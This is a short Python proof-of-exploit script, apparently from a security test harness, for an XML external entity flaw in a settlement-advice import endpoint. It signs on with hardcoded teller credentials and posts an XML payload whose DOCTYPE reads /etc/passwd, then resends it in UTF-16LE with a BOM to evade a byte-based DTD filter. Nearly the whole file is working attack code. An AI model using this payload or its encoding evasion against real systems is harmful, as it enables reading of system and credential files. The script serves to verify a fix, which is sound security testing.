"""LG-XXE-001 proof-of-exploit: XML external entity injection in the console settlement-advice import.

Signs on for a real session, then POSTs an XML advice whose DOCTYPE declares an external SYSTEM entity
pointing at /etc/passwd and references it in <memo>. With correspondent_advices=on the parser
resolves the entity and echoes the file contents back; fires when the reply contains 'root:'. Sends
the advice in UTF-8 and again in UTF-16LE with a BOM (which hides '<!DOCTYPE' from a byte search), so
a byte-only DTD check fires this under baseline too. With the fix the DTD is refused in either
encoding (400). Hits the console directly. Env: PASCAL_URL.
"""

from harness import env, http

PAYLOAD = ('<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
           "<advice><memo>&x;</memo></advice>")


def _utf16() -> bytes:
    declared = '<?xml version="1.0" encoding="UTF-16"?>' + PAYLOAD.split("?>", 1)[1]
    return b"\xff\xfe" + declared.encode("utf-16-le")


def fire():
    console = env.url("PASCAL_URL")
    client, _ = http.console_sign_on(console, "TLR001", "teller-pw")
    reply = None
    for encoding, body in (("UTF-8", PAYLOAD.encode("utf-8")), ("UTF-16LE", _utf16())):
        reply = client.post(f"{console}/import", data=body, headers={"content-type": "application/xml"})
        if "root:" in reply.text:
            first = reply.text.splitlines()[0][:80]
            return True, f"({encoding}) external entity resolved, /etc/passwd leaked -> {first}"
    return False, reply.text[:200]
